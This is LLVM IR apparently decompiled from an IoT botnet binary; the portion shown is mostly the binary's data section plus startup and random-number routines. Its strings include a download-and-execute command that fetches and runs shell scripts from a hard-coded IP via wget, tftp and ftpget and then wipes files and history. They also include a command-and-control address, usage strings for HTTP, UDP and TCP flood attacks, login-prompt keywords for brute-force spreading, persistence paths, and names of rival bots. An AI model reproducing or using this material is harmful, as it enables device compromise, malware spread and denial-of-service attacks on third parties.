source_filename = "test"
target datalayout = "e-m:e-p:32:32-f64:32:64-f80:32-n8:16:32-S128"

%_TYPEDEF_sigset_t = type { [1 x i32] }
%timespec = type { i32, i32 }
%sigcontext = type { i32 }
%sigaction = type { void (i32)*, i32, void ()*, %_TYPEDEF_sigset_t }
%pollfd = type { i32, i16, i16 }

@cf = internal unnamed_addr global i1 false
@df = internal unnamed_addr global i1 false
@of = internal unnamed_addr global i1 false
@eax = internal unnamed_addr global i32 0
@ecx = internal unnamed_addr global i32 0
@edx = internal unnamed_addr global i32 0
@ebx = internal unnamed_addr global i32 0
@esp = internal unnamed_addr global i32 0
@ebp = internal unnamed_addr global i32 0
@esi = internal unnamed_addr global i32 0
@edi = internal unnamed_addr global i32 0
@0 = external global i32
@global_var_8059674.2 = global i32 0
@global_var_80596a4.3 = local_unnamed_addr global i32* @global_var_8059674.2
@global_var_8058664.4 = constant i32 0
@global_var_805a6c4.5 = global i32 0
@global_var_8059678.6 = local_unnamed_addr global i32 0
@global_var_805a700.7 = global i32 0
@global_var_805a704.8 = local_unnamed_addr global i32 0
@global_var_805a708.9 = local_unnamed_addr global i32 0
@global_var_805a430.10 = local_unnamed_addr global i32 4095
@global_var_805a42c.11 = local_unnamed_addr global i32 362436
@global_var_80562bd.12 = constant [7 x i8] c"(null)\00"
@global_var_80562c4.14 = constant [3 x i8] c"-c\00"
@global_var_80562c7.15 = constant [3 x i8] c"sh\00"
@global_var_80562ca.16 = constant [8 x i8] c"/bin/sh\00"
@global_var_80562e0.17 = constant i32 -1
@global_var_805a6e0.18 = local_unnamed_addr global i32 0
@global_var_80566e0.19 = constant [5 x i8] c"PING\00"
@global_var_80562b1.20 = constant [8 x i8] c"busybox\00"
@global_var_80562b9.21 = constant i32 2293796
@global_var_80562bb.22 = constant i32 1848115235
@global_var_805a3e0.23 = global [3 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_80562b1.20, i32 0, i32 0), i8* bitcast (i32* @global_var_80562b9.21 to i8*), i8* bitcast (i32* @global_var_80562bb.22 to i8*)]
@global_var_8056285.24 = constant [7 x i8] c"nvalid\00"
@global_var_805628c.25 = constant [6 x i8] c"ailed\00"
@global_var_8056292.26 = constant [9 x i8] c"ncorrect\00"
@global_var_805629b.27 = constant [6 x i8] c"enied\00"
@global_var_80562a1.28 = constant [5 x i8] c"rror\00"
@global_var_80562a6.29 = constant [7 x i8] c"oodbye\00"
@global_var_80562ad.30 = constant [4 x i8] c"bad\00"
@global_var_805a3c0.31 = global [7 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8056285.24, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805628c.25, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8056292.26, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805629b.27, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_80562a1.28, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_80562a6.29, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_80562ad.30, i32 0, i32 0)]
@global_var_805a6e8.32 = local_unnamed_addr global i32 0
@global_var_805a6ec.33 = local_unnamed_addr global i32 0
@global_var_8060974.34 = local_unnamed_addr global i32 0
@global_var_80566e5.35 = constant [6 x i8] c":>%$#\00"
@global_var_80566ec.40 = constant [12 x i8] c"%d.%d.%d.%d\00"
@global_var_8060968.41 = local_unnamed_addr global i32 0
@global_var_8056220.42 = constant [15 x i8] c"/dev/netslink/\00"
@global_var_805622f.43 = constant [6 x i8] c"/tmp/\00"
@global_var_8056235.44 = constant [6 x i8] c"/var/\00"
@global_var_805623b.45 = constant [6 x i8] c"/dev/\00"
@global_var_8056241.46 = constant [10 x i8] c"/var/run/\00"
@global_var_805624b.47 = constant [10 x i8] c"/dev/shm/\00"
@global_var_8056255.48 = constant [6 x i8] c"/mnt/\00"
@global_var_805625b.49 = constant [7 x i8] c"/boot/\00"
@global_var_8056262.50 = constant [6 x i8] c"/usr/\00"
@global_var_8056268.51 = constant [6 x i8] c"/opt/\00"
@global_var_805a380.52 = global [10 x i8*] [i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_8056220.42, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805622f.43, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8056235.44, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805623b.45, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8056241.46, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_805624b.47, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8056255.48, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_805625b.49, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8056262.50, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8056268.51, i32 0, i32 0)]
@global_var_805a3ac = external global i32
@global_var_80566f8.57 = constant [3 x i8] c"\0D\0A\00"
@global_var_805a400.58 = global [10 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8056285.24, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805628c.25, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8056292.26, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805629b.27, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_80562a1.28, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_80562a6.29, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_80562ad.30, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_80562b1.20, i32 0, i32 0), i8* bitcast (i32* @global_var_80562b9.21 to i8*), i8* bitcast (i32* @global_var_80562bb.22 to i8*)]
@global_var_80566fc.59 = constant i32 993090331
@global_var_8056759.60 = constant [5 x i8] c"sh\0D\0A\00"
@global_var_805675e.61 = constant [8 x i8] c"shell\0D\0A\00"
@global_var_80556d0.62 = constant [443 x i8] c"cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://188.166.150.230/bassboots.sh; chmod 777 bassboots.sh; sh bassboots.sh; tftp 188.166.150.230 -c get ktftp1.sh; chmod 777 ktftp1.sh; sh ktftp1.sh; tftp -r ktftp2.sh -g 188.166.150.230; chmod 777 ktftp2.sh; sh ktftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 188.166.150.230 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bassboots.sh ktftp1.sh ktftp2.sh ftp1.sh; rm -rf *;history -c\0D\0A\00"
@global_var_8059754.63 = local_unnamed_addr global [443 x i8]* @global_var_80556d0.62
@global_var_8056788.64 = constant [6 x i8] c"arfgG\00"
@global_var_805678e.65 = constant [9 x i8] c"HBiug655\00"
@global_var_8056797.66 = constant [13 x i8] c"KJYDFyljf754\00"
@global_var_80567a4.67 = constant [20 x i8] c"LIKUGilkut769458905\00"
@global_var_80567b8.68 = constant [17 x i8] c"JHFDSkgfc5747694\00"
@global_var_80567c9.69 = constant [12 x i8] c"GJjyur67458\00"
@global_var_80567d5.70 = constant [12 x i8] c"RYSDk747586\00"
@global_var_80567e1.71 = constant [12 x i8] c"HKJGi5r8675\00"
@global_var_80567ed.72 = constant [10 x i8] c"KHGK7985i\00"
@global_var_80567f7.73 = constant [11 x i8] c"yuituiILYF\00"
@global_var_8056802.74 = constant [14 x i8] c"GKJDghfcjkgd4\00"
@global_var_8056810.75 = constant [12 x i8] c"uygtfgtrevf\00"
@global_var_805681c.76 = constant [13 x i8] c"tyeuhygbtfvg\00"
@global_var_8056829.77 = constant [9 x i8] c"ewqdcftr\00"
@global_var_8056832.78 = constant [16 x i8] c"trbazetghhnbrty\00"
@global_var_8056842.79 = constant [11 x i8] c"tbhrwsehbg\00"
@global_var_805684d.80 = constant [12 x i8] c"twehgbferhb\00"
@global_var_8056859.81 = constant [12 x i8] c"etrbhhgetrb\00"
@global_var_8056865.82 = constant [14 x i8] c"edfverthbyrtb\00"
@global_var_8056873.83 = constant [14 x i8] c"kmiujmnhnhfgn\00"
@global_var_8056881.84 = constant [14 x i8] c"zcdbvgdfsbgfd\00"
@global_var_805688f.85 = constant [10 x i8] c"gdfbtsdgb\00"
@global_var_8056899.86 = constant [14 x i8] c"ghdugffytsdyt\00"
@global_var_80568a7.87 = constant [14 x i8] c"tgerthgwtrwry\00"
@global_var_80568b5.88 = constant [12 x i8] c"yteytietyue\00"
@global_var_80568c1.89 = constant [9 x i8] c"qsortEQS\00"
@global_var_80568ca.90 = constant [16 x i8] c"8969876hjkghblk\00"
@global_var_80568da.91 = constant [4 x i8] c"std\00"
@global_var_80568de.92 = constant [4 x i8] c"dts\00"
@global_var_80568e2.93 = constant [4 x i8] c"lsk\00"
@global_var_80568e6.94 = constant [4 x i8] c"kek\00"
@global_var_80568ea.95 = constant [6 x i8] c"smack\00"
@global_var_80568f0.96 = constant [4 x i8] c"ily\00"
@global_var_80568f4.97 = constant [4 x i8] c"tyf\00"
@global_var_80568f8.98 = constant [4 x i8] c"pos\00"
@global_var_80568fc.99 = constant [6 x i8] c"cunts\00"
@global_var_8056920.100 = constant [36 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8056788.64, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_805678e.65, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_8056797.66, i32 0, i32 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @global_var_80567a4.67, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_80567b8.68, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_80567c9.69, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_80567d5.70, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_80567e1.71, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_80567ed.72, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_80567f7.73, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8056802.74, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_8056810.75, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_805681c.76, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8056829.77, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_8056832.78, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_8056842.79, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_805684d.80, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_8056859.81, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8056865.82, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8056873.83, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8056881.84, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_805688f.85, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8056899.86, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_80568a7.87, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_80568b5.88, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_80568c1.89, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_80568ca.90, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_80568da.91, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_80568de.92, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_80568e2.93, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_80568e6.94, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80568ea.95, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_80568f0.96, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_80568f4.97, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_80568f8.98, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80568fc.99, i32 0, i32 0)]
@global_var_80569b0.101 = constant [64 x i8] c"%s %s HTTP/1.1\0D\0AHost: %s\0D\0AUser-Agent: %s\0D\0AConnection: close\0D\0A\0D\0A\00"
@global_var_80569f0.102 = constant [27 x i8] c"Failed opening raw socket.\00"
@global_var_8056a0c.103 = constant [33 x i8] c"Failed setting raw headers mode.\00"
@global_var_8056a2d.104 = constant [4 x i8] c"all\00"
@global_var_8056a31.105 = constant i32 2037579820
@global_var_8056a33.106 = constant [4 x i8] c"syn\00"
@global_var_8056a37.107 = constant [4 x i8] c"rst\00"
@global_var_8056a3b.108 = constant [4 x i8] c"fin\00"
@global_var_8056a3f.109 = constant [4 x i8] c"ack\00"
@global_var_8056a43.110 = constant [4 x i8] c"psh\00"
@global_var_8056a47.111 = constant [18 x i8] c"Invalid flag \22%s\22\00"
@global_var_8056a59.112 = constant [6 x i8] c"PONG!\00"
@global_var_8056a5f.113 = constant [6 x i8] c"PUSSY\00"
@global_var_8056a65.114 = constant [4 x i8] c"OFF\00"
@global_var_8060970.115 = local_unnamed_addr global i32 0
@global_var_8056a69.116 = constant [14 x i8] c"REP STOPPING!\00"
@global_var_8056a77.117 = constant [3 x i8] c"ON\00"
@global_var_8056a7a.118 = constant [5 x i8] c"HTTP\00"
@global_var_8056a80.119 = constant [38 x i8] c"HTTP %s Flooding %s:%d for %d seconds\00"
@global_var_8056aa6.120 = constant [4 x i8] c"UDP\00"
@global_var_8056aac.121 = constant [113 x i8] c"UDP <target> <port (0 for random)> <time> <netmask> <packet size> <poll interval> <sleep check> <sleep time(ms)>\00"
@global_var_8056b1d.122 = constant [4 x i8] c"TCP\00"
@global_var_8056b24.123 = constant [186 x i8] c"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)\00"
@global_var_8056bde.124 = constant [4 x i8] c"STD\00"
@global_var_8056be2.125 = constant [27 x i8] c"STD <target> <port> <time>\00"
@global_var_8056bfd.126 = constant [5 x i8] c"STOP\00"
@global_var_805a378.127 = local_unnamed_addr global i32 -1
@global_var_80556bb.128 = constant [20 x i8] c"188.166.150.230:123\00"
@global_var_8059750.129 = global [20 x i8]* @global_var_80556bb.128
@global_var_8056c02.130 = constant [8 x i8] c"8.8.8.8\00"
@global_var_8056c0a.131 = constant [16 x i8] c"/proc/net/route\00"
@global_var_8056c1a.132 = constant [11 x i8] c"\0900000000\09\00"
@global_var_8056c25.134 = constant [7 x i8] c"x86_32\00"
@global_var_8056c2c.135 = constant i32 1952788224
@global_var_8056c2d.136 = constant [19 x i8] c"/etc/rc.d/rc.local\00"
@1 = constant i32 1697579122
@global_var_8056c42.138 = constant [13 x i8] c"/etc/rc.conf\00"
@global_var_8056c51.140 = constant [8 x i8] c"\22%s%s\22\0A\00"
@global_var_8056c59.141 = constant i32 1868955745
@global_var_8056c5b.142 = constant [13 x i8] c"fork failed\0A\00"
@global_var_8056c68.143 = constant i32 993090331
@global_var_8056ccf.144 = constant [5 x i8] c"PONG\00"
@global_var_8056cd4.145 = constant [9 x i8] c"LELIMDUP\00"
@global_var_8056cdd.146 = constant [20 x i8] c"PEACE OUT IMMA DUP\0A\00"
@global_var_8056cf1.147 = constant [11 x i8] c"STOLENBOTS\00"
@global_var_8056cfc.148 = constant [8 x i8] c"%s 2>&1\00"
@global_var_8056d04.149 = constant [3 x i8] c"%s\00"
@global_var_8056d07.150 = constant i32 32
@global_var_8060930.151 = local_unnamed_addr global i32 0
@global_var_805a438 = external local_unnamed_addr global i32
@global_var_8060940.157 = global i32 0
@global_var_805a474.158 = global i32 0
@global_var_805e704.159 = local_unnamed_addr global i32 0
@global_var_805e708.160 = local_unnamed_addr global i32 0
@global_var_805a48c.161 = local_unnamed_addr global i32 2
@global_var_805a45c.162 = global i32 0
@global_var_805a458.163 = global i32* bitcast (i16* @global_var_805a4a0.154 to i32*)
@global_var_8057320.164 = constant i32 0
@global_var_8057338.165 = constant [6 x i8] c"(nil)\00"
@global_var_805733e.166 = constant [7 x i8] c"(null)\00"
@global_var_8057345.167 = constant i32 2949163
@global_var_80573b2.169 = constant i32 327688
@global_var_80573aa.170 = constant [8 x i8] c" +0-#'I\00"
@global_var_8057358.171 = constant [9 x i8] c"hlLjztqZ\00"
@global_var_8057395.172 = constant [21 x i8] c"npxXoudifFeEgGaACScs\00"
@global_var_805738b.173 = constant i32 117506048
@global_var_805737c.174 = constant i32 331776
@global_var_8057400.175 = constant [8 x i8] c"Success\00"
@global_var_80573d6.176 = constant [15 x i8] c"Unknown error \00"
@global_var_8058300.177 = constant i32 65536
@global_var_805a6a0.178 = local_unnamed_addr global i32* @global_var_8058300.177
@global_var_8060720.179 = global i32 0
@global_var_8060724.180 = global i32 0
@global_var_8060740.181 = global i32 0
@global_var_806090c.182 = global i32 0
@global_var_805a6a8.183 = global i32 0
@global_var_8060d94.184 = local_unnamed_addr global i32 0
@global_var_8060d88.185 = global i32 0
@global_var_8060980.186 = global i32 0
@global_var_805a590.187 = global i32 0
@global_var_8060a2c.189 = global i32 0
@global_var_8060a30.190 = local_unnamed_addr global i32 0
@global_var_8060a34.191 = global i32 0
@global_var_8060a40.192 = local_unnamed_addr global i32 0
@global_var_8060d34.193 = global i32 0
@global_var_8060d5c.194 = local_unnamed_addr global i32 0
@global_var_8060d4c.195 = local_unnamed_addr global i32 0
@global_var_8060d50.196 = local_unnamed_addr global i32 0
@global_var_8060d54.197 = local_unnamed_addr global i32 0
@global_var_8060d70.198 = local_unnamed_addr global i32 0
@global_var_8060d58.199 = local_unnamed_addr global i32 0
@global_var_8060d64.200 = local_unnamed_addr global i32 0
@global_var_8060d68.201 = local_unnamed_addr global i32 0
@global_var_8060d74.202 = local_unnamed_addr global i32 0
@global_var_8060d48.203 = local_unnamed_addr global i32 0
@global_var_8060d44.205 = local_unnamed_addr global i32 0
@global_var_8060d6c.206 = local_unnamed_addr global i32 0
@global_var_8060a3c.207 = local_unnamed_addr global i32 0
@global_var_805a5a8.208 = global i32 0
@global_var_805a5c0.210 = global i32 0
@global_var_805a5d8 = external global i32
@global_var_805a604.212 = global i32 -1726662223
@global_var_805a5e0.213 = local_unnamed_addr global i32* @global_var_805a604.212
@global_var_805a5dc.214 = global i32* @global_var_805a604.212
@global_var_8057f74.215 = constant i32 0
@global_var_8057f60.216 = constant i32 0
@global_var_805a680.217 = global i32 0
@global_var_8060924.218 = local_unnamed_addr global i32 0
@global_var_806092c.219 = local_unnamed_addr global i32 0
@global_var_8059668.221 = global i32 -1
@global_var_8051abf.222 = constant i32 -294069
@global_var_8060934.223 = local_unnamed_addr global i32 0
@global_var_8060938.224 = local_unnamed_addr global i32 0
@global_var_80581e0.225 = constant [10 x i8] c"/dev/null\00"
@global_var_8060928.227 = local_unnamed_addr global i32 0
@global_var_8051ca7.229 = constant i32 1928542531
@global_var_8051ccb.230 = constant i32 1928542531
@global_var_8060964.231 = local_unnamed_addr global i32 0
@global_var_8060944.232 = global i32 0
@global_var_8058510.234 = constant [4 x i8] c"inf\00"
@global_var_8058513.239 = constant i32 1179535616
@global_var_8058520.240 = constant i32 2883630
@global_var_8060d98.244 = local_unnamed_addr global i32 0
@global_var_80585dc.245 = constant i32 1697579054
@global_var_8058610.246 = constant i32 1868824690
@global_var_80585de.247 = constant [17 x i8] c"/etc/resolv.conf\00"
@global_var_80585ef.248 = constant [24 x i8] c"/etc/config/resolv.conf\00"
@global_var_8058607.249 = constant [11 x i8] c"nameserver\00"
@global_var_8058612.250 = constant [7 x i8] c"domain\00"
@global_var_8058619.251 = constant [7 x i8] c"search\00"
@global_var_8060d78.252 = global i32 0
@global_var_8060d9c.253 = local_unnamed_addr global i32 0
@global_var_8060da0.254 = local_unnamed_addr global i32 0
@global_var_8058634.255 = constant [17 x i8] c"0123456789abcdef\00"
@global_var_8058631.257 = constant [3 x i8] c"%x\00"
@global_var_8058645.258 = constant [11 x i8] c"/etc/hosts\00"
@global_var_8058650.259 = constant [18 x i8] c"/etc/config/hosts\00"
@global_var_805a6c0.1 = local_unnamed_addr global i8 0
@global_var_805e700.13 = external local_unnamed_addr global i8*
@global_var_805a6fb.36 = local_unnamed_addr global i8 0
@global_var_805a6fc.37 = local_unnamed_addr global i8 0
@global_var_805a6fd.38 = local_unnamed_addr global i8 0
@global_var_805a6fe.39 = local_unnamed_addr global i8 0
@global_var_805a6f0.133 = external global i8*
@2 = internal constant [2 x i8] c"/\00"
@global_var_8056c4f.139 = constant i8* getelementptr inbounds ([2 x i8], [2 x i8]* @2, i32 0, i32 0)
@global_var_805a4a0.154 = global i16 288
@global_var_805a4f0.155 = local_unnamed_addr global i16 272
@global_var_80573ca.168 = external constant i8*
@global_var_8060a00.188 = global i8 0
@global_var_8060d60.204 = local_unnamed_addr global i8 0
@global_var_8060920.209 = local_unnamed_addr global i8 0
@global_var_806093c.226 = local_unnamed_addr global i8 0
@global_var_8058540.237 = constant x86_fp80* null
@global_var_8060948.241 = external global i8*
@global_var_8060960.242 = local_unnamed_addr global i64 0
@global_var_805a6a4.243 = local_unnamed_addr global i16 1
@global_var_8056c40.137 = constant [2 x i8] c"r\00"

declare void @__pseudo_call(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @_init() local_unnamed_addr {
entry:
  %v0_8048097 = load i32, i32* @ebx, align 4
  %v1_8048098 = call i32 @__get_pc_thunk_bx(i32 %v0_8048097)
  %v0_804809d = load i32, i32* @ebx, align 4
  %v1_804809d = add i32 %v0_804809d, 71135
  store i32 %v1_804809d, i32* @ebx, align 4
  %v0_80480a3 = call i32 @frame_dummy()
  %v0_80480a8 = call i32 @__do_global_ctors_aux()
  ret i32 %v0_80480a8
}

define i32 @__get_pc_thunk_bx(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @ebx, align 4
  %v0_80480b3 = load i32, i32* @eax, align 4
  ret i32 %v0_80480b3
}

define i32 @__do_global_dtors_aux() local_unnamed_addr {
entry:
  %v0_80480c6 = load i8, i8* @global_var_805a6c0.1, align 64
  %v1_80480c6 = icmp eq i8 %v0_80480c6, 0
  br i1 %v1_80480c6, label %dec_label_pc_80480db.preheader, label %entry.dec_label_pc_8048102_crit_edge

entry.dec_label_pc_8048102_crit_edge:             ; preds = %entry
  %v0_8048103.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_8048102

dec_label_pc_80480db.preheader:                   ; preds = %entry
  %v0_80480db1 = load i32, i32* bitcast (i32** @global_var_80596a4.3 to i32*), align 4
  %v1_80480e22 = icmp eq i32 %v0_80480db1, 0
  %v1_80480e49 = icmp eq i1 %v1_80480e22, false
  br i1 %v1_80480e49, label %dec_label_pc_80480d1.lr.ph, label %dec_label_pc_80480e6

dec_label_pc_80480d1.lr.ph:                       ; preds = %dec_label_pc_80480db.preheader
  br label %dec_label_pc_80480d1

dec_label_pc_80480d1:                             ; preds = %dec_label_pc_80480d1.lr.ph, %dec_label_pc_80480d1
  %v0_80480d1 = phi i32 [ %v0_80480db1, %dec_label_pc_80480d1.lr.ph ], [ %v0_80480db, %dec_label_pc_80480d1 ]
  %v1_80480d1 = add i32 %v0_80480d1, 4
  store i32 %v1_80480d1, i32* bitcast (i32** @global_var_80596a4.3 to i32*), align 4
  call void @__pseudo_call(i32 %v0_80480d1)
  %v0_80480db = load i32, i32* bitcast (i32** @global_var_80596a4.3 to i32*), align 4
  %v1_80480e2 = icmp eq i32 %v0_80480db, 0
  %v1_80480e4 = icmp eq i1 %v1_80480e2, false
  br i1 %v1_80480e4, label %dec_label_pc_80480d1, label %dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge

dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge: ; preds = %dec_label_pc_80480d1
  br label %dec_label_pc_80480e6

dec_label_pc_80480e6:                             ; preds = %dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge, %dec_label_pc_80480db.preheader
  store i8 1, i8* @global_var_805a6c0.1, align 64
  br label %dec_label_pc_8048102

dec_label_pc_8048102:                             ; preds = %entry.dec_label_pc_8048102_crit_edge, %dec_label_pc_80480e6
  %v0_8048103 = phi i32 [ %v0_8048103.pre, %entry.dec_label_pc_8048102_crit_edge ], [ 0, %dec_label_pc_80480e6 ]
  ret i32 %v0_8048103

; uselistorder directives
  uselistorder i32 %v0_80480db, { 1, 0 }
  uselistorder i32 %v0_80480d1, { 1, 0 }
  uselistorder i32* bitcast (i32** @global_var_80596a4.3 to i32*), { 1, 2, 0 }
  uselistorder i8* @global_var_805a6c0.1, { 1, 0 }
  uselistorder label %dec_label_pc_8048102, { 1, 0 }
  uselistorder label %dec_label_pc_80480d1, { 1, 0 }
}

define i32 @frame_dummy() local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_8048110 = load i32, i32* @ebp, align 4
  store i32 %v0_8048110, i32* %stack_var_-4, align 4
  %v4_8048110 = ptrtoint i32* %stack_var_-4 to i32
  store i32 0, i32* @eax, align 4
  store i32 %v4_8048110, i32* @ebp, align 4
  %v0_804811b = call i32 @function_8048120()
  ret i32 %v0_804811b

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @function_8048120() local_unnamed_addr {
dec_label_pc_8048120:
  %v0_8048127 = load i32, i32* @eax, align 4
  %v1_8048127 = icmp eq i32 %v0_8048127, 0
  br i1 %v1_8048127, label %dec_label_pc_804814a, label %dec_label_pc_804812b

dec_label_pc_804812b:                             ; preds = %dec_label_pc_8048120
  %v1_8048145 = call i32 @unknown_0(i32 ptrtoint (i32* @global_var_8058664.4 to i32))
  br label %dec_label_pc_804814a

dec_label_pc_804814a:                             ; preds = %dec_label_pc_8048120, %dec_label_pc_804812b
  %v0_804814a = load i32, i32* @global_var_8059678.6, align 8
  %v1_804814f = icmp eq i32 %v0_804814a, 0
  br i1 %v1_804814f, label %dec_label_pc_8048165, label %dec_label_pc_8048153

dec_label_pc_8048153:                             ; preds = %dec_label_pc_804814a
  br label %dec_label_pc_8048165

dec_label_pc_8048165:                             ; preds = %dec_label_pc_8048153, %dec_label_pc_804814a
  ret i32 0

; uselistorder directives
  uselistorder label %dec_label_pc_804814a, { 1, 0 }
}

define i32 @_start(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %stack_var_4 = alloca i32, align 4
  store i32 %arg1, i32* @esi, align 4
  %v0_8048170 = load i32, i32* @eax, align 4
  store i32 %v0_8048170, i32* %stack_var_-4, align 4
  %v4_8048170 = ptrtoint i32* %stack_var_-4 to i32
  %v0_8048172 = load i32, i32* @edx, align 4
  %v9_8048184 = call i32 @__uClibc_main(i32 134533346, i32 %arg1, i32* nonnull %stack_var_4, i32 134512788, i32 134564292, i32 %v0_8048172, i32 %v4_8048170, i32 %v0_8048170)
  ret i32 %v9_8048184

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @init_rand(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @global_var_805a700.7, align 256
  %v1_804819d = add i32 %arg1, -1640531527
  store i32 %v1_804819d, i32* @global_var_805a704.8, align 4
  %v1_80481aa = add i32 %arg1, 1013904242
  store i32 %v1_80481aa, i32* %eax.global-to-local, align 4
  store i32 %v1_80481aa, i32* @global_var_805a708.9, align 8
  br label %dec_label_pc_80481bd

dec_label_pc_80481bd:                             ; preds = %entry, %dec_label_pc_80481bd
  %storemerge5 = phi i32 [ 3, %entry ], [ %v4_80481ed, %dec_label_pc_80481bd ]
  %v1_80481c3 = add nsw i32 %storemerge5, -3
  store i32 %v1_80481c3, i32* %eax.global-to-local, align 4
  %v1_80481c6 = mul nuw nsw i32 %v1_80481c3, 4
  %v2_80481c6 = add i32 %v1_80481c6, ptrtoint (i32* @global_var_805a700.7 to i32)
  %v3_80481c6 = inttoptr i32 %v2_80481c6 to i32*
  %v4_80481c6 = load i32, i32* %v3_80481c6, align 4
  %v1_80481d0 = add nsw i32 %storemerge5, -2
  store i32 %v1_80481d0, i32* %eax.global-to-local, align 4
  %v1_80481d3 = mul nuw nsw i32 %v1_80481d0, 4
  %v2_80481d3 = add i32 %v1_80481d3, ptrtoint (i32* @global_var_805a700.7 to i32)
  %v3_80481d3 = inttoptr i32 %v2_80481d3 to i32*
  %v4_80481d3 = load i32, i32* %v3_80481d3, align 4
  %v2_80481da = xor i32 %v4_80481d3, %v4_80481c6
